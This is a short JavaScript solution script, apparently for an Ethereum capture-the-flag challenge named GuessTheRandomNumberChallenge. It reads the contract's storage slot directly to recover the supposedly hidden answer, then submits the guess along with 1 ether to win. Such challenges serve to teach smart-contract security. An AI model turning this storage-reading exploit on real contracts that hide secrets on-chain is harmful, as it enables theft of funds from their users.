async function main() {
    Challenge = await ethers.getContractFactory('GuessTheRandomNumberChallenge');
    challenge = await Challenge.attach('0x1A3ce5eAd30Bae115578A84764a201d581927264');
    answer = await ethers.provider.getStorageAt(challenge.address, 0);
    tx = await challenge.guess(ethers.BigNumber.from(answer),{value:ethers.utils.parseEther('1')});
    console.log(tx);
    await tx.wait();
    console.log('Challenge completed:', await challenge.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error);
      process.exit(1);
  })